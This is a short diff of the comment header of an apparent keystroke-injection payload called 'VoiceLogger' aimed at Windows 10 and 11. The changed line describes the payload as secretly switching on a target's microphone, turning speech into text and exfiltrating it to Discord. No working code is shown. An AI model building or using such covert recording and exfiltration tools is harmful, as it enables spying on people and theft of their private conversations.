@@ -2,7 +2,7 @@ REM     Title: VoiceLogger
 
 REM     Author: I am Jakoby
 
-REM     Description: This payload is meant to do an advanced recon of the target's PC. See README.md file for more details.
+REM     This payload activates your targets microphone and converts their speech to text and exfils it to discord
 
 REM     Target: Windows 10, 11
 
